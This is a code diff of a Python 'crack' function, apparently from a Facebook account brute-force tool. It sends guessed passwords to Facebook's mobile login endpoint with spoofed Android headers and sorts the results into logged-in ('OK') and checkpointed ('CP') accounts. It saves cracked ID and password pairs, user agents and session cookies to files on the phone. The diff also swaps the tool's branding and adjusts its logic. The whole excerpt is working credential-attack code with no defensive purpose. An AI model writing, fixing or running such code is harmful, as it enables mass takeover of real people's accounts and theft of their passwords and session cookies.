@@ -1424,25 +1424,23 @@ def crack(idf,pwv):
 			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0',"accept-encoding":"gzip, deflate br",'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','origin': 'https://p.facebook.com','referer': 'https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-asbd-id': '198387','x-fb-lsd': 'AVokZHZJEcA','x-requested-with': 'XMLHttpRequest','x-response-format': 'JSONStream','user-agent': ua})
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
-				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
+				print(f'\r \x1b[1;91m[BLADE-CP] {idf} | {pw}')     
+				#open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
 				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r\r\x1b[38;5;46m[BLADE-OK] '+idf+ ' | '+pw+'')
+				open('/sdcard/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+				
 			else:
 				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
+		except requests.exceptions.ConnectionError:
+			time.sleep(10)
 	loop+=1
 
 	
